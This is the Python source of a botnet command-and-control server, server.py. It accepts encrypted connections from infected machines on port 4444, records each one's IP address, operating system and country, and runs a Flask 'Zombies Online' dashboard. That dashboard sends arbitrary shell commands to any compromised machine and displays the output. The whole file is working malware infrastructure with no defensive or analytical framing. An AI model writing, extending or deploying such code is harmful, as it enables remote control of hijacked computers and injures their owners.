# === server.py ===
import os
import pickle
import socket
import threading
import platform
import base64
import time
from flask import Flask, render_template_string, request, jsonify
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import geocoder

app = Flask(__name__)
SOCKET_PORT = 4444
SERVER_HOST = socket.gethostbyname(socket.gethostname())
SOCKET_KEY = b'd8f7b1c6e4a5e93a1c4d2f8a765b3e6d91c0e27a58f7c4b3e3d4f9a871c2b7dd'  # 32 bytes key
SOCKET_IV = b'a7f3c1d8b0e2f4a9d3c7e1b2f6a8c9e0'  # 16 bytes IV
BOTS_FILE = 'bots.pkl'
clients = {}

# AES ENCRYPTION/DECRYPTION

def encrypt_msg(msg):
    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
    pad = 16 - len(msg) % 16
    msg += chr(pad) * pad
    return cipher.encrypt(msg.encode())

def decrypt_msg(msg):
    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
    decrypted = cipher.decrypt(msg)
    pad = decrypted[-1]
    return decrypted[:-pad].decode()

# SOCKET HANDLER

def handle_client(conn, addr):
    ip = addr[0]
    try:
        info = decrypt_msg(conn.recv(2048))
        osys, version = info.split('|')
        country = geocoder.ip(ip).country or 'Unknown'
        bot_id = len(clients) + 1
        clients[bot_id] = {'ip': ip, 'status': 'Online', 'os': f"{osys} {version}", 'country': country, 'conn': conn}
        save_bots()
        broadcast_update()
        while True:
            try:
                time.sleep(5)
                conn.send(encrypt_msg('ping'))
            except:
                break
    finally:
        for bot_id, data in list(clients.items()):
            if data['ip'] == ip:
                data['status'] = 'Offline'
                broadcast_update()
                break

def save_bots():
    with open(BOTS_FILE, 'wb') as f:
        pickle.dump(clients, f)

def load_bots():
    global clients
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'rb') as f:
            clients = pickle.load(f)

# SOCKET SERVER INIT

def socket_server():
    s = socket.socket()
    s.bind((SERVER_HOST, SOCKET_PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# FLASK GUI
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zombies Online</title>
    <style>
        body { background: #0f0f0f; color: #f0f0f0; font-family: Arial; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #333; padding: 8px; text-align: center; }
        th { background-color: #444; }
        .online { color: lime; }
        .offline { color: red; }
    </style>
    <script>
        setInterval(() => fetch('/session').then(res => res.json()).then(data => {
            const tbody = document.getElementById('bots');
            tbody.innerHTML = '';
            for (const bot of data.bots) {
                tbody.innerHTML += `
                    <tr>
                        <td>${bot.id}</td>
                        <td class="${bot.status.toLowerCase()}">${bot.status}</td>
                        <td>${bot.ip}</td>
                        <td>${bot.os}</td>
                        <td><a href="/shell-id=${bot.id}">🕹️</a></td>
                        <td>${bot.country}</td>
                    </tr>`;
            }
            document.getElementById('count').innerText = data.total;
        }), 5000);
    </script>
</head>
<body>
    <h1>Zombies Online: <span id="count">0</span></h1>
    <table>
        <thead>
            <tr>
                <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th><th>Country</th>
            </tr>
        </thead>
        <tbody id="bots"></tbody>
    </table>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/session')
def session():
    bots = []
    for bot_id, data in clients.items():
        bots.append({
            'id': bot_id,
            'status': data['status'],
            'ip': data['ip'],
            'os': data['os'],
            'country': data['country']
        })
    return jsonify({'total': len(clients), 'bots': bots})

@app.route('/shell-id=<int:bot_id>', methods=['GET', 'POST'])
def shell(bot_id):
    if bot_id not in clients:
        return 'Bot not found'
    conn = clients[bot_id]['conn']
    if request.method == 'POST':
        command = request.form['cmd']
        try:
            conn.send(encrypt_msg(command))
            output = decrypt_msg(conn.recv(4096))
            return f'<pre>{output}</pre>'
        except:
            return 'Error communicating with bot.'
    return '''
        <form method="post">
            <input type="text" name="cmd" placeholder="Enter command">
            <input type="submit" value="Send">
        </form>
    '''

if __name__ == '__main__':
    load_bots()
    threading.Thread(target=socket_server, daemon=True).start()
    app.run(host='0.0.0.0', port=80, debug=False)
